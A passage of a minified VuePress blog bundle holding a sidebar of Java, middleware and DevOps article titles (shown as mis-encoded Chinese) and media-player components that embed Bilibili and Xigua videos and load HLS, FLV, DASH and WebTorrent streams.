å¨æå»ºè¡¨","/spring/spring-boot/204/"],["01.Spring/03.spring boot/205.Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯.md","Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯","/spring/spring-boot/205/"],["01.Spring/03.spring boot/206.Spring Boot éæ FastDFS.md","Spring Boot éæ FastDFS","/spring/spring-boot/206/"],["01.Spring/03.spring boot/207.Spring Boot VUEååç«¯å è§£å¯.md","Spring Boot VUEååç«¯å è§£å¯","/spring/spring-boot/207/"]]},{title:"spring cloud",collapsable:!1,children:[["01.Spring/04.spring cloud/1.SpringCloud ä¹ RibbonåFeign.md","SpringCloud ä¹ RibbonåFeign","/spring/spring-cloud/1/"],["01.Spring/04.spring cloud/2.SpringCloud alibaba - Nacos.md","SpringCloud alibaba - Nacos","/spring/spring-cloud/2/"]]}]},{title:"Mybatis",collapsable:!1,children:[{title:"mybatis",collapsable:!1,children:[["02.Mybatis/31.mybatis/300.æ ¸å¿åè½æè§£ å·¥ä½æµç¨.md","æ ¸å¿åè½æè§£ å·¥ä½æµç¨","/mybatis/mybatis/300/"],["02.Mybatis/31.mybatis/301.æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°.md","æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°","/mybatis/mybatis/301/"],["02.Mybatis/31.mybatis/302.æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç.md","æ ¸å¿åè½æè§£ ä¸äºçº§ç¼å­åç","/mybatis/mybatis/302/"],["02.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­.md","MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­","/mybatis/mybatis/303/"]]}]},{title:"maven",collapsable:!1,children:[["03.maven/2300.pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£.md","pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£","/maven/2300/"],["03.maven/2301.dependencies æ ç­¾è¯¦è§£.md","dependencies æ ç­¾è¯¦è§£","/maven/2301/"],["03.maven/2302.ä½¿ç¨ Nexus3.x æ­å»ºç§æ.md","ä½¿ç¨ Nexus3.x æ­å»ºç§æ","/maven/2302/"]]}],"/02.ä¸­é´ä»¶/":[{title:"kafka",collapsable:!1,children:[["01.kafka/1400.kafka-2.7.0 åºæ¬æ¦å¿µ.md","kafka-2.7.0 åºæ¬æ¦å¿µ","/kafka/1400"],["01.kafka/1401.Kafka-2.7.0 æ­å»ºååæ°è§£æ.md","Kafka-2.7.0 æ­å»ºååæ°è§£æ","/kafka/1401"],["01.kafka/1402.kafka-2.7.0 spring boot éæ kafka.md","kafka-2.7.0 spring boot éæ kafka","/kafka/1402"],["01.kafka/1403.kafka-2.7.0 kafka Connect.md","kafka-2.7.0 kafka Connect","/kafka/1403"],["01.kafka/1404.kafka-2.7.0 Kafka Streams æµå¤ç.md","kafka-2.7.0 Kafka Streams æµå¤ç","/kafka/1404"]]},{title:"redis",collapsable:!1,children:[["03.redis/1600.Redisä»ç».md","Redis ä»ç»","/redis/1600"],["03.redis/1601.Rediså½ä»¤ä»ç».md","Rediså½ä»¤ä»ç»","/redis/1601"],["03.redis/1602.Redisåå¸å¼éä»ç».md","Redisåå¸å¼éä»ç»","/redis/1602"],["03.redis/1603.Redisäºå¡ä»ç».md","Redisäºå¡ä»ç»","/Redis/1603"],["03.redis/1604.Redisçkeyå¤±æéç¥ä»ç».md","Redisçkeyå¤±æéç¥ä»ç»","/Redis/1604"],["03.redis/1605.Rediséç½®æä»¶è§£è¯».md","Rediséç½®æä»¶è§£è¯»","/Redis/1605"],["03.redis/1606.Redisè®°ä¸æ¬¡å®æºææ¥.md","Redisè®°ä¸æ¬¡å®æºææ¥","/Redis/1606"],["03.redis/1607.Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º.md","Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º","/Redis/1607"],["03.redis/1608.Redisé«å¯ç¨(äº) å¨åµçè®º.md","Redisé«å¯ç¨(äº) å¨åµçè®º","/Redis/1608"],["03.redis/1609.Redisé«å¯ç¨(ä¸) æ­å»º.md","Redisé«å¯ç¨(ä¸) æ­å»º","/Redis/1609"]]},{title:"nginx",collapsable:!1,children:[["04.nginx/1700.Nginx åºæ¬æ¦å¿µåä»ç».md","Nginx åºæ¬æ¦å¿µåä»ç»","/nginx/1"]]},{title:"Elasticsearch",collapsable:!1,children:[["05.Elasticsearch/1800.ES 7.8.0ï¼ä¸ï¼ å¥é¨ä»ç».md","ES 7.8.0ï¼ä¸ï¼ å¥é¨ä»ç»","/es/1800"],["05.Elasticsearch/1801.ES 7.8.0ï¼äºï¼ è¯»ãåååç´¢å¼æµç¨ä»¥åææ¡£åæè¿ç¨.md","ES 7.8.0ï¼äºï¼ è¯»ãåååç´¢å¼æµç¨ä»¥åææ¡£åæè¿ç¨","/es/1801"],["05.Elasticsearch/1802.ES 7.8.0ï¼ä¸ï¼ ææ¡£å²çª.md","ES 7.8.0ï¼ä¸ï¼ ææ¡£å²çª","/es/1802"]]}],"/03.å¤§æ°æ®/":[{title:"mysql",collapsable:!1,children:[["04.mysql/1300.MySQL ç´¢å¼ä»ç».md","MySQL ç´¢å¼ä»ç»","/mysql/1300"],["04.mysql/1301.MySQL éä»ç».md","MySQL éä»ç»","/mysql/1301"],["04.mysql/1302.MySQL ç´¢å¼ä¼åå·¥å· explain.md","MySQL ç´¢å¼ä¼åå·¥å· explain","/mysql/1302"]]},{title:"mongodb",collapsable:!1,children:[["05.mongodb/1800.mongodb.md","mongodb","/mongodb/1800/"]]}],"/04.è¿ç»´/":[{title:"Docker",collapsable:!1,children:[["40.Docker/400.Docker æ¦å¿µãå½ä»¤åDockerfileä»ç».md","Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»","/docker/400"],["40.Docker/401.Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨.md","Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨","/docker/401"],["40.Docker/402.Dockerç§æåºçå¼å.md","Dockerç§æåºçå¼å","/docker/402"]]},{title:"Jenkins",collapsable:!1,children:[["50.Jenkins/500.Jenkins(ä¸) æç»­éæåJenkinsä»ç».md","Jenkins(ä¸) æç»­éæåJenkinsä»ç»","/jenkins/500"],["50.Jenkins/501.Jenkins(äº) Jenkinså®è£åç¯å¢éç½®.md","Jenkins(äº) Jenkinså®è£åç¯å¢éç½®","/jenkins/501"],["50.Jenkins/502.Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯.md","Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯","/jenkins/502"],["50.Jenkins/503.Jenkins(å) Mavenå®è£åéç½®.md","Jenkins(å) Mavenå®è£åéç½®","/jenkins/503"],["50.Jenkins/504.Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®.md","Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®","/jenkins/504"],["50.Jenkins/505.Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è.md","Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è","/jenkins/505"],["50.Jenkins/506.Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md","Jenkins(ä¸) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼","/jenkins/506"],["50.Jenkins/507.Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼.md","Jenkins(å«) Jenkins+Docker+SpringCloudå¾®æå¡æç»­éæï¼ä¸ï¼","/jenkins/507"]]},{title:"Kubernetes",collapsable:!1,children:[["60.Kubernetes/600.kubernetes(ä¸) æ¦å¿µåä»ç».md","kubernetes(ä¸) æ¦å¿µåä»ç»","/kubernetes/600"],["60.Kubernetes/601.kubernetes(äº) éç¾¤ç¯å¢æ­å»º.md","kubernetes(äº) éç¾¤ç¯å¢æ­å»º","/kubernetes/601"],["60.Kubernetes/602.kubernetes(ä¸) èµæºç®¡ç.md","kubernetes(ä¸) èµæºç®¡ç","/kubernetes/602"],["60.Kubernetes/603.kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç».md","kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»","/kubernetes/603"],["60.Kubernetes/604.kubernetes(äº) Pod ä»ç»åéç½®.md","kubernetes(äº) Pod ä»ç»åéç½®","/kubernetes/604"],["60.Kubernetes/605.kubernetes(å­) Pod çå½å¨æ.md","kubernetes(å­) Pod çå½å¨æ","/kubernetes/605"],["60.Kubernetes/606.kubernetes(ä¸) Pod è°åº¦.md","kubernetes(ä¸) Pod è°åº¦","/kubernetes/606"],["60.Kubernetes/607.kubernetes(å«) Pod æ§å¶å¨è¯¦è§£.md","kubernetes(å«) Pod æ§å¶å¨è¯¦è§£","/kubernetes/607"],["60.Kubernetes/608.kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨.md","kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨","/kubernetes/608"],["60.Kubernetes/609.kubernetes(å) Ingressä»ç»åä½¿ç¨.md","kubernetes(å) Ingressä»ç»åä½¿ç¨","/kubernetes/609"],["60.Kubernetes/610.kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼.md","kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼","/kubernetes/610"],["60.Kubernetes/611.kubernetes(åäº) å®å¨è®¤è¯.md","kubernetes(åäº) å®å¨è®¤è¯","/kubernetes/611"],["60.Kubernetes/612.kubernetes(åä¸) DashBoard.md","kubernetes(åä¸) DashBoard","/kubernetes/612"]]},{title:"linux",collapsable:!1,children:[["2300.linux/2300.Linux åå»ºç¨æ·åæéæä½.md","linux åå»ºç¨æ·åæéæä½","/linux/2300"],["2300.linux/2301.Linux ç£çæä½ç¸å³å½ä»¤.md","Linux ç£çæä½ç¸å³å½ä»¤","/linux/2301"],["2300.linux/2302.Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤.md","Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤","/linux/2302"],["2300.linux/2303.Linux å®æ¶ä»»å¡.md","Linux å®æ¶ä»»å¡","/linux/2303"],["2300.linux/2304.Linux å½ä»¤æ»ç».md","Linux å½ä»¤æ»ç»","/linux/2304"],["2300.linux/2305.Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³.md","Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³","/linux/2305"]]}]},extendFrontmatter:{article:!1},updateBar:{showToArticle:!1,moreArticle:"/archives"},social:{icons:[{iconClass:"icon-gitee",title:"gitee",link:"https://gitee.com/dashboard"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/landashu?tab=repositories"},{iconClass:"icon-youjian",title:"åé®ä»¶",link:"mailto:875730567@qq.com"}]},footer:{createYear:2023,copyrightInfo:"\n\x3c!--      <a href='https://doc.xugaoyi.com/' target='_blank'>Theme by Vdoing</a> | <a href='http://doc.aizuda.com/' rel='external nofollow' target='_blank'>Copyright Â© 2022-2023 AiZuDa</a>--\x3e\n\x3c!--      <br>--\x3e\n\x3c!--      <a href=\"http://beian.miit.gov.cn/\" target=\"_blank\">é²ICPå¤2021041554å·-1</a>--\x3e\n    "}}},Xs=(t(116),t(213),t(111),t(223)),Ys=t(224),Qs=(t(377),t(158),t(52));var Zs={computed:{$filterPosts:function(){return this.$site.pages.filter((function(n){var e=n.frontmatter,t=e.pageComponent,r=e.article,a=e.home;return!(t||!1===r||!0===a)}))},$sortPosts:function(){return(n=this.$filterPosts).sort((function(n,e){var t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Qs.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Qs.a)(n,e)})),n;var n},$sortPostsByDate:function(){return(n=this.$filterPosts).sort((function(n,e){return Object(Qs.a)(n,e)})),n;var n},$groupPosts:function(){return function(n){for(var e={},t={},r=function(r,a){var o=n[r].frontmatter,i=o.categories,s=o.tags;"array"===Object(Qs.n)(i)&&i.forEach((function(t){t&&(e[t]||(e[t]=[]),e[t].push(n[r]))})),"array"===Object(Qs.n)(s)&&s.forEach((function(e){e&&(t[e]||(t[e]=[]),t[e].push(n[r]))}))},a=0,o=n.length;a<o;a++)r(a);return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags:function(){return function(n){var e=[],t=[];for(var r in n.categories)e.push({key:r,length:n.categories[r].length});for(var a in n.tags)t.push({key:a,length:n.tags[a].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Ba.component(Xs.default),Ba.component(Ys.default);function nl(n){return n.toString().padStart(2,"0")}t(381);Ba.component("Badge",(function(){return Promise.all([t.e(1),t.e(12)]).then(t.bind(null,582))})),Ba.component("CodeBlock",(function(){return Promise.resolve().then(t.bind(null,223))})),Ba.component("CodeGroup",(function(){return Promise.resolve().then(t.bind(null,224))}));t(382);var el=Ba.extend({props:{bvid:{type:String,default:{page:1,danmaku:!0,allowfullscreen:"allowfullscreen",sandbox:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",width:"100%",height:[.5625,70]}.bvid,required:!0},danmaku:{type:Boolean,default:!0,required:!1},page:{type:Number,default:1,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,70]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//player.bilibili.com/player.html?bvid=".concat(this.bvid,"&page=").concat(this.page,"&danmaku=").concat(this.danmaku),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),tl=Ba.extend({props:{xid:{type:String,default:null,required:!0},id:{type:String,default:null,required:!1},autoplay:{type:Boolean,default:!1,required:!1},startTime:{type:Number,default:0,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//www.ixigua.com/iframe/".concat(this.xid,"?").concat(this.id?"id="+this.id+"&":"","autoplay=").concat(this.autoplay?1:0,"&startTime=").concat(this.startTime),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),rl=t(23),al=t(17),ol=(t(106),t(151),function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(6).then(t.t.bind(null,475,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d,u,m,g,f,h,b,v,y,k,x,w,S,j,E,A,T,_,I,C,P,R,B,O;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(m=r.default,g=!1,f=!1,h=!1,b=!1,v=!1,e.src.video.customType=(null===(a=e.src)||void 0===a||null===(o=a.video)||void 0===o?void 0:o.customType)||{},null!==(i=e.src)&&void 0!==i&&null!==(s=i.video)&&void 0!==s&&s.type||(null!==(y=e.src)&&void 0!==y&&null!==(k=y.video)&&void 0!==k&&k.url.toLowerCase().endsWith(".m3u8")?e.src.video.type="hls":null!==(x=e.src)&&void 0!==x&&null!==(w=x.video)&&void 0!==w&&w.url.toLowerCase().endsWith(".flv")?e.src.video.type="flv":null!==(S=e.src)&&void 0!==S&&null!==(j=S.video)&&void 0!==j&&j.url.toLowerCase().endsWith(".mpd")&&(e.src.video.type="shakaDash")),null===(l=e.src)||void 0===l||null===(c=l.video)||void 0===c||!c.type||"string"!=typeof e.src.video.type){n.next=27;break}n.t0=e.src.video.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.video.type="smplayerDplayerHls",g=!0,n.abrupt("break",27);case 15:return e.src.video.type="smplayerDplayerFlv",f=!0,n.abrupt("break",27);case 18:return e.src.video.type="smplayerDplayerDash",h=!0,n.abrupt("break",27);case 21:return e.src.video.type="smplayerDplayerShakaDash",b=!0,n.abrupt("break",27);case 24:return e.src.video.type="smplayerDplayerWebtorrent",v=!0,n.abrupt("break",27);case 27:if(null!=(null===(p=e.src)||void 0===p||null===(d=p.video)||void 0===d?void 0:d.quality)&&e.src.video.quality.length>0&&e.src.video.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerDplayerHls",g=!0;break;case"flv":n.type="smplayerDplayerFlv",f=!0;break;case"dash":n.type="smplayerDplayerDash",h=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerDplayerShakaDash",b=!0;break;case"webtorrent":n.type="smplayerDplayerWebtorrent",v=!0}})),g&&Object.assign(null===(E=e.src)||void 0===E||null===(A=E.video)||void 0===A?void 0:A.customType,{smplayerDplayerHls:function(n,e){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var r=t.default,a=n.src,o=new r;o.attachMedia(n),o.on(r.Events.MEDIA_ATTACHED,(function(){o.loadSource(a)})),e.on("destroy",(function(){o.destroy()}))}))}}),f&&Object.assign(null===(T=e.src)||void 0===T||null===(_=T.video)||void 0===_?void 0:_.customType,{smplayerDplayerFlv:function(n,e){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var r=t.default.createPlayer({type:"flv",url:n.src});r.attachMediaElement(n),r.load(),e.on("destroy",(function(){r.destroy()}))}))}}),h&&Object.assign(null===(I=e.src)||void 0===I||null===(C=I.video)||void 0===C?void 0:C.customType,{smplayerDplayerDash:function(n,e){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var r=t.default.MediaPlayer().create();r.initialize(n,n.src,!1),e.on("destroy",(function(){r.reset()}))}))}}),b&&Object.assign(null===(P=e.src)||void 0===P||null===(R=P.video)||void 0===R?void 0:R.customType,{smplayerDplayerShakaDash:function(n,e){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var r=new t.default.Player(n);r.load(n.src).then((function(){e.on("destroy",(function(){r.destroy()}))}))}))}}),v&&Object.assign(null===(B=e.src)||void 0===B||null===(O=B.video)||void 0===O?void 0:O.customType,{smplayerDplayerWebtorrent:function(n,e){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var r=new(0,t.default);r.add(n.src,(function(t){t.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),e.on("destroy",(function(){r.destroy()}))}))}))}}),null===(u=e.src)||void 0===u||!u.customInit){n.next=39;break}return n.next=36,e.src.customInit(m,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new m(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),il=t(24),sl=t.n(il),ll=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{container:null},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({container:null},n.src)),{},{container:n.$refs.sbplayer}),n.player=new ol(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),cl=(t(107),function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,Promise.all([Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,481,7)),Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,482,7))]).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(l=Object(Ki.a)(r,1),c=l[0].default,e.src.customAudioType=(null===(a=e.src)||void 0===a?void 0:a.customAudioType)||{},p=!1,null===(o=e.src)||void 0===o||null===(i=o.audio)||void 0===i||i.forEach((function(n){if(n.type||n.url.toLowerCase().endsWith(".m3u8")&&(n.type="hls"),n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerAplayerHls",p=!0}})),p&&Object.assign(null===(d=e.src)||void 0===d?void 0:d.customAudioType,{smplayerAplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=!1===r.audio.paused;if(n.canPlayType("application/x-mpegURL")||n.canPlayType("application/vnd.apple.mpegURL"))n.src=e.url;else if(a.isSupported()){var i=new a;i.attachMedia(n),i.on(a.Events.MEDIA_ATTACHED,(function(){i.loadSource(e.url)})),r.on("destroy",(function(){i.destroy()}))}else r.notice("Error: HLS is not supported.");o&&r.play()}))}}),null===(s=e.src)||void 0===s||!s.customInit){n.next=11;break}return n.next=8,e.src.customInit(c,e.src).then((function(n){return e.player=n,e.player}));case 8:n.t0=n.sent,n.next=12;break;case 11:n.t0=new c(e.src);case 12:return e.player=n.t0,n.abrupt("return",e.player);case 14:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;!this.player||null!==(n=this.src)&&void 0!==n&&n.fixed||this.player.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),pl=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({lrcType:3},n.src)),{},{container:n.$refs.sbplayer}),n.player=new cl(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t),n.$nextTick((function(){if(n.src.fixed){var e=document.querySelector("#app");null==e||e.append(n.$el)}}));case 7:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),dl=function(){function n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(4).then(t.t.bind(null,483,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var a,o,i,s,l,c,p,d,u,m,g,f,h,b,v,y,k,x,w,S,j,E;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(c=r.default,p=!1,d=!1,u=!1,m=!1,g=!1,e.src.customType=(null===(a=e.src)||void 0===a?void 0:a.customType)||{},null!==(o=e.src)&&void 0!==o&&o.type||(null!==(f=e.src)&&void 0!==f&&null!==(h=f.url)&&void 0!==h&&h.toLowerCase().endsWith(".m3u8")?e.src.type="hls":null!==(b=e.src)&&void 0!==b&&null!==(v=b.url)&&void 0!==v&&v.toLowerCase().endsWith(".flv")?e.src.type="flv":null!==(y=e.src)&&void 0!==y&&null!==(k=y.url)&&void 0!==k&&k.toLowerCase().endsWith(".mpd")&&(e.src.type="shakaDash")),null===(i=e.src)||void 0===i||!i.type||"string"!=typeof e.src.type){n.next=27;break}n.t0=e.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.type="smplayerArtplayerHls",p=!0,n.abrupt("break",27);case 15:return e.src.type="smplayerArtplayerFlv",d=!0,n.abrupt("break",27);case 18:return e.src.type="smplayerArtplayerDash",u=!0,n.abrupt("break",27);case 21:return e.src.type="smplayerArtplayerShakaDash",m=!0,n.abrupt("break",27);case 24:return e.src.type="smplayerArtplayerWebtorrent",g=!0,n.abrupt("break",27);case 27:if(null!=(null===(s=e.src)||void 0===s?void 0:s.quality)&&e.src.quality.length>0&&e.src.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerArtplayerHls",p=!0;break;case"flv":n.type="smplayerArtplayerFlv",d=!0;break;case"dash":n.type="smplayerArtplayerDash",u=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerArtplayerShakaDash",m=!0;break;case"webtorrent":n.type="smplayerArtplayerWebtorrent",g=!0}})),p&&Object.assign(null===(x=e.src)||void 0===x?void 0:x.customType,{smplayerArtplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var a=t.default,o=new a;o.attachMedia(n),o.on(a.Events.MEDIA_ATTACHED,(function(){o.loadSource(e)})),r.on("destroy",(function(){o.destroy()}))}))}}),d&&Object.assign(null===(w=e.src)||void 0===w?void 0:w.customType,{smplayerArtplayerFlv:function(n,e,r){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var a=t.default.createPlayer({type:"flv",url:e});a.attachMediaElement(n),a.load(),r.on("destroy",(function(){a.destroy()}))}))}}),u&&Object.assign(null===(S=e.src)||void 0===S?void 0:S.customType,{smplayerArtplayerDash:function(n,e,r){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var a=t.default.MediaPlayer().create();a.initialize(n,e,!1),r.on("destroy",(function(){a.reset()}))}))}}),m&&Object.assign(null===(j=e.src)||void 0===j?void 0:j.customType,{smplayerArtplayerShakaDash:function(n,e,r){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var a=new t.default.Player(n);a.load(e).then((function(){r.on("destroy",(function(){a.destroy()}))}))}))}}),g&&Object.assign(null===(E=e.src)||void 0===E?void 0:E.customType,{smplayerArtplayerWebtorrent:function(n,e,r){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var a=new(0,t.default);a.add(e,(function(e){e.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),r.on("destroy",(function(){a.destroy()}))}))}))}}),null===(l=e.src)||void 0===l||!l.customInit){n.next=39;break}return n.next=36,e.src.customInit(c,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new c(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return 